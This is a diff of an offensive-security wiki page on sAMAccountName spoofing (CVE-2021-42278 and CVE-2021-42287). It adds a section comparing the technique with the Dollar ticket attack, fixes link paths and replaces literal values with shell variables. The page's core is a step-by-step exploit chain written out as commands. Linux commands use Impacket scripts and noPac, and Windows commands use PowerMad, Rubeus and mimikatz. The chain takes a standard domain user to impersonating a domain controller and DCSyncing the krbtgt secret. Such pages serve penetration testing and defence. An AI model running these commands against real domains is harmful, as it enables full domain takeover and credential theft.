@@ -10,6 +10,22 @@ category: ad
 
 In November 2021, two vulnerabilities caught the attention of many security researchers as they could allow domain escalation from a standard user.
 
+### Relationship with other principal confusion attacks
+
+[sAMAccountName spoofing](./samaccountname-spoofing) and the [Dollar ticket attack](./dollar-ticket) both exploit weaknesses in how Active Directory and Kerberos handle machine account naming conventions (specifically the trailing `$`).
+
+Common root causes:
+- The long-standing convention that machine accounts end with `$` in their `sAMAccountName`.
+- KDC behavior that can append or resolve `$` when a requested principal name does not exactly match an existing account.
+- Abuse of [MachineAccountQuota](../../builtins/machineaccountquota.md) to create machine accounts.
+
+Key differences compared to the [Dollar ticket attack](./dollar-ticket):
+- sAMAccountName spoofing targets Windows domain escalation (instead of Linux LPE)
+- Goal is to impersonate a domain controller and perform DCSync
+- Involves renaming a machine account's `sAMAccountName` combined with S4U2self (more complex)
+
+The [Dollar ticket attack](./dollar-ticket) is a simpler technique that abuses similar name confusion mechanics, but primarily targets domain-joined Linux/Unix hosts.
+
 ### CVE-2021-42278 - Name impersonation
 
 Computer accounts should have a trailing `$` in their name (i.e. `sAMAccountName` attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.
@@ -27,7 +43,7 @@ When requesting a Service Ticket, presenting a TGT is required first. When the s
 
 ### Machine Account
 
-The ability to edit a machine account's `sAMAccountName` and `servicePrincipalName` attributes is a requirement to the attack chain. The easiest way this can be achieved is by creating a computer account (e.g. by leveraging the [MachineAccountQuota](../builtins/machineaccountquota.md) domain-level attribute if it's greater than 0). The creator of the new machine account has enough privileges to edit its attributes. Alternatively, taking control over the owner/creator of a computer account should do the job.
+The ability to edit a machine account's `sAMAccountName` and `servicePrincipalName` attributes is a requirement to the attack chain. The easiest way this can be achieved is by creating a computer account (e.g. by leveraging the [MachineAccountQuota](../../builtins/machineaccountquota.md) domain-level attribute if it's greater than 0). The creator of the new machine account has enough privileges to edit its attributes. Alternatively, taking control over the owner/creator of a computer account should do the job.
 
 The attack can then be conducted as follows.
 
@@ -36,13 +52,7 @@ The attack can then be conducted as follows.
 3. Request a TGT for the controlled machine account
 4. Reset the controlled machine account `sAMAccountName` to its old value (or anything else different than the Domain Controller's name without the trailing `$`)
 5. Request a service ticket with S4U2self by presenting the TGT obtained before -> [CVE-2021-42287](samaccountname-spoofing.md#cve-2021-42287-kdc-lookup)
-6. Get access to the domain controller (i.e. [DCSync](../credentials/dumping/dcsync.md))
-
-> [!NOTE]
-> At the time of writing this recipe, some of the tools and features that allow exploitation of these vulnerabilities are still in development
-> 
-> * Impacket's getST: [https://github.com/SecureAuthCorp/impacket/pull/1202](https://github.com/SecureAuthCorp/impacket/pull/1202)
-> * Impacket's renameMachine: [https://github.com/SecureAuthCorp/impacket/pull/1224](https://github.com/SecureAuthCorp/impacket/pull/1224)
+6. Get access to the domain controller (i.e. [DCSync](../../credentials/dumping/dcsync.md))
 
 ::: tabs
 
@@ -55,36 +65,36 @@ On UNIX-like systems, the steps mentioned above can be conducted with
 
 ```bash
 # 0. create a computer account
-addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
+addcomputer.py -computer-name "$COMPUTER_ACCOUNT" -computer-pass "$COMPUTER_PASSWORD" -dc-host "$DC_HOST$" -domain-netbios "$DOMAIN_NETBIOS" "$DOMAIN/$USER:$PASSWORD"
 
 # 1. clear its SPNs
-addspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'
+addspn.py --clear -t "$COMPUTER_ACCOUNT" -u "$DOMAIN\\$USER" -p "$PASSWORD" "$DC_HOST"
 
 # 2. rename the computer (computer -> DC)
-renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
+renameMachine.py -current-name "$COMPUTER_ACCOUNT" -new-name "$DOMAIN_CONTROLLER" -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
 
 # 3. obtain a TGT
-getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'
+getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$DOMAIN_CONTROLLER":"$PASSWORD"
 
 # 4. reset the computer name
-renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
+renameMachine.py -current-name "$DOMAIN_CONTROLLER" -new-name "$COMPUTER_ACCOUNT" "$DOMAIN/$USER:$PASSWORD"
 
 # 5. obtain a service ticket with S4U2self by presenting the previous TGT
-KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
+KRB5CCNAME="DomainController.ccache" getST.py -self -impersonate "$TARGET_USER" -altservice "cifs/$DC_HOST" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"DomainController"
 
 # 6. DCSync by presenting the service ticket
-KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
+KRB5CCNAME="DomainAdmin.ccache" secretsdump.py -just-dc-user "krbtgt" -k -no-pass -dc-ip "$DC_HOST" @"$DC_HOST"
 ```
 
 [noPac.py](https://github.com/Ridter/noPac) (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.
 
 ```bash
-scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP
-noPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump
+scanner.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP"
+noPac.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP" --impersonate Administrator -dump
 ```
 
 > [!TIP]
-> When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs, which allows to skip step #1.
+> When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). The SAMR method creates the account without SPNs, which allows to skip step #1.
 
 
 === Windows
@@ -93,12 +103,12 @@ On Windows systems, the steps mentioned above can be conducted with
 
 * [PowerMad](https://github.com/Kevin-Robertson/Powermad/)'s (PowerShell) `New-MachineAccount` and `Set-MachineAccountAttribute` functions for the creation and manipulation of a computer account
 * with [Rubeus](https://github.com/GhostPack/Rubeus) (C#) for the requests of Kerberos TGT and Service Ticket
-* with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) for the [DCSync](../credentials/dumping/dcsync.md) operation with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync)
+* with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) for the [DCSync](../../credentials/dumping/dcsync.md) operation with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync)
 
 ```powershell
 # 0. create a computer account
-$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
-New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
+$password = ConvertTo-SecureString $PASSWORD -AsPlainText -Force
+New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "$DOMAIN" -DomainController "$DC_HOST" -Verbose
 
 # 1. clear its SPNs
 Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose
@@ -107,23 +117,23 @@ Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -
 Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
 
 # 3. obtain a TGT
-Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
+Rubeus.exe asktgt /user:"DomainController" /password:"$PASSWORD" /domain:"$DOMAIN" /dc:"$DC_HOST" /nowrap
 
 # 4. reset the computer name
 Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
 
 # 5. obtain a service ticket with S4U2self by presenting the previous TGT
-Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
+Rubeus.exe s4u /self /impersonateuser:"$TARGET_USER" /altservice:"ldap/$DC_HOST" /dc:"$DC_HOST" /ptt /ticket:[Base64 TGT]
 
 # 6. DCSync
-(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
+(mimikatz) lsadump::dcsync /domain:$DOMAIN /kdc:$DC_HOST /user:krbtgt 
 ```
 
 [noPac](https://github.com/cube0x0/noPac) (C#) is an automated alternative that can be used to scan and abuse unpatched targets.
 
 ```powershell
-noPac.exe scan -domain domain.local -user "lowpriv" -pass "lowpriv"
-noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.local /mAccount pillemann11 /mPassword pilleman11 /service ldaps /ptt /impersonate Administrator
+noPac.exe scan -domain $DOMAIN -user "$USER" -pass "$PASSWORD"
+noPac.exe -domain mcafeelab.local -user "$USER" -pass "$PASSWORD" /dc dc.domain.local /mAccount pillemann11 /mPassword pilleman11 /service ldaps /ptt /impersonate Administrator
 (mimikatz) lsadump::dcsync /domain:mcafeelab.local /all
 ```
 
@@ -133,14 +143,14 @@ noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.
 > [!WARNING]
 > In the screenshot below, the `-spn` argument is used in the `getST.py` command. The option is to be replaced with `-altservice`.
 
-![](<./assets/sAMAccountName spoofing example.png>)
+![](<../assets/sAMAccountName spoofing example.png>)
 sAMAccountName spoofing example{.caption}
 
 ### User account
 
-An alternative to using computer accounts is to have enough permissions against a user account (cf. [Access Controls abuse](../dacl/)) to edit its `sAMAccountName` attribute (i.e. `WriteProperty` on the attribute, or on the « general information » or « public information » property sets, or `GenericWrite`, or `GenericAll`).
+An alternative to using computer accounts is to have enough permissions against a user account (cf. [Access Controls abuse](../../dacl/)) to edit its `sAMAccountName` attribute (i.e. `WriteProperty` on the attribute, or on the « general information » or « public information » property sets, or `GenericWrite`, or `GenericAll`).
 
-This attack path also requires knowledge of the user account password or hash (to obtain a TGT), which can be obtained (or set) in many ways (e.g. [Targeted Kerberoasting](../dacl/targeted-kerberoasting.md), [Shadow Credentials](shadow-credentials.md), [Forced Password Change](../dacl/forcechangepassword.md)).
+This attack path also requires knowledge of the user account password or hash (to obtain a TGT), which can be obtained (or set) in many ways (e.g. [Targeted Kerberoasting](../../dacl/targeted-kerberoasting.md), [Shadow Credentials](../shadow-credentials.md), [Forced Password Change](../../dacl/forcechangepassword.md)).
 
 Appart from the computer account creation and SPNs manipulation, the exploitation steps are the same as with a [machine account](samaccountname-spoofing.md#machine-account). If the account has SPNs that point to its name, they will have to be removed for the renaming operation to work.
 
@@ -153,3 +163,7 @@ Appart from the computer account creation and SPNs manipulation, the exploitatio
 [https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing)
 
 [https://twitter.com/snovvcrash/status/1471829627765239816](https://twitter.com/snovvcrash/status/1471829627765239816)
+
+## See also
+
+* [Dollar Ticket attack](./dollar-ticket)
